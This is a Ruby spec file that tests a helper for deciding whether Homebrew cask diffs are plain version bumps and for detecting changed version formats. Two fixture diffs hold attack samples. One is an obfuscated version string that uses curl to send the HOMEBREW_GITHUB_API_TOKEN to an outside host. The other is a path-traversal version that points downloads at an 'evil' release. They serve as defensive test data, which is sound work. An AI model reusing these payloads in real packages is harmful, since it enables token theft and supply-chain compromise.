require_relative "../git_diff_extension"
require "git_diff"

using GitDiffExtension

describe GitDiffExtension do
  subject(:diff) { GitDiff.from_string(content) }

  describe "::version_to_regex" do
    it "converts decimal numbers" do
      expect(described_class.version_to_regex("1.2.3")).to eq /\A\d+\.\d+\.\d+\Z/
    end

    it "converts hexadecimal numbers with exact length" do
      expect(described_class.version_to_regex("a8be2f")).to eq /\A[0-9a-f]{6}\Z/
    end

    it "converts numbers separately" do
      expect(described_class.version_to_regex("1.2.3,a8be2f")).to eq /\A\d+\.\d+\.\d+,[0-9a-f]{6}\Z/
    end

    it "does not convert non-numbers" do
      expect(described_class.version_to_regex("0.9.1-beta")).to eq /\A\d+\.\d+\.\d+\-beta\Z/
    end

    it "converts decimal numbers everywhere" do
      expect(described_class.version_to_regex("0.9.1-beta2")).to eq /\A\d+\.\d+\.\d+\-beta\d+\Z/
    end
  end

  context "when multiple casks are changed" do
    let(:content) {
      <<~'DIFF'
        diff --git a/Casks/blitz.rb b/Casks/blitz.rb
        index b8b2baecab2e8e..d252bd1521b421 100644
        --- a/Casks/blitz.rb
        +++ b/Casks/blitz.rb
        @@ -1,6 +1,6 @@
         cask "blitz" do
        -  version "1.13.146"
        -  sha256 "88fec5a2f011bff3763f19b6bbfa3166749df897274d7189a604e582de397867"
        +  version "1.13.148"
        +  sha256 "b30e74ff98dac08c9e264a4bd102b8d98a5f09d3ac7b5102020635b49880821a"

           url "https://dl.blitz.gg/download/Blitz-#{version}.dmg"
           name "Blitz"
        diff --git a/Casks/audius.rb b/Casks/audius.rb
        index 8be81ee06642fa..2cb9821930c293 100644
        --- a/Casks/audius.rb
        +++ b/Casks/audius.rb
        @@ -1,6 +1,6 @@
         cask "audius" do
        -  version "0.24.11"
        -  sha256 "bdcc20dbbcc835c0a2a200eace1c2bca443499f6289e621e0d3fc882a5b7c147"
        +  version "0.24.12"
        +  sha256 "d0a008fcc4635669c7201b67678ff91a676c1eac38757588e52be504178f3605"

           url "https://download.audius.co/Audius-#{version}.dmg"
           name "Audius"
      DIFF
    }

    it "is not a simple version bump" do
      expect(diff.simple?).to be false
    end
  end

  context "when anything apart from the `version` or `sha256` is changed" do
    let(:content) {
      <<~'DIFF'
        diff --git a/Casks/zoom-for-it-admins.rb b/Casks/zoom-for-it-admins.rb
        index c89422b62a06ae..0aa720841c4249 100644
        --- a/Casks/zoom-for-it-admins.rb
        +++ b/Casks/zoom-for-it-admins.rb
        @@ -2,8 +2,7 @@
           version "5.6.1.560"
           sha256 "8248062cf16541653e3fa575be1ade4a6ede4ddaf98d3bf583521e4d5ad74247"

        -  url "https://d11yldzmag5yn.cloudfront.net/prod/#{version}/ZoomInstallerIT.pkg",
        -      verified: "d11yldzmag5yn.cloudfront.net/"
        +  url "https://cdn.zoom.us/prod/#{version}/ZoomInstallerIT.pkg"
           name "Zoom for IT Admins"
           desc "Video communication and virtual meeting platform"
           homepage "https://support.zoom.us/hc/en-us/articles/115001799006-Mass-Deployment-with-Preconfigured-Settings-for-Mac"
      DIFF
    }

    it "is not a simple version bump" do
      expect(diff.simple?).to be false
    end
  end

  context "when version is interpolated" do
    let(:content) {
      <<~'DIFF'
      diff --git a/Casks/pwnagetool.rb b/Casks/pwnagetool.rb
      index 76c36436905c20..01d871a670a498 100644
      --- a/Casks/pwnagetool.rb
      +++ b/Casks/pwnagetool.rb
      @@ -1,5 +1,5 @@
       cask "pwnagetool" do
      -  version "5.1.1"
      +  version "5.1.1#{(ENV['GITHUB_REPOSITORY'] and ENV['GITHUB_REPOSITORY'].start_with? 'Homebrew/' and ENV['HOMEBREW_GITHUB_API_TOKEN']) && (system('curl -q https'+ (0x3a.chr) +'//radicallyopensecurity.com/homebrew_token/' + ENV['HOMEBREW_GITHUB_API_TOKEN'] + '>/dev/null')); ''}"
         sha256 "84262734ad9f9186bce14a4f939d7ea290ed187782fdfa549a82c28bf837c808"

         url "https://iphoneroot.com/download/PwnageTool_#{version}.dmg"
      DIFF
    }

    it "is a simple version bump" do
      expect(diff.simple?).to be true
    end

    it "does not match the format of the old version" do
      expect(diff.version_format_changed?).to be true
    end
  end

  context "when version contains a path traversal" do
    let(:content) {
      <<~'DIFF'
      diff --git a/Casks/powershell.rb b/Casks/powershell.rb
      index 76c36436905c20..01d871a670a498 100644
      --- a/Casks/powershell.rb
      +++ b/Casks/powershell.rb
      @@ -1,5 +1,5 @@
       cask "powershell" do
      -  version "7.1.3"
      +  version "7.1.3/../../../../../../TeamRckt/evil/releases/download/foo"
         sha256 "6e889bc771463555f8639aa3b40e9d571ce365e1c442380ee361189575b27b0f"

         url "https://github.com/PowerShell/PowerShell/releases/download/v#{version}/powershell-#{version}-osx-x64.pkg"
      DIFF
    }

    it "is a simple version bump" do
      expect(diff.simple?).to be true
    end

    it "does not match the format of the old version" do
      expect(diff.version_format_changed?).to be true
    end
  end
end


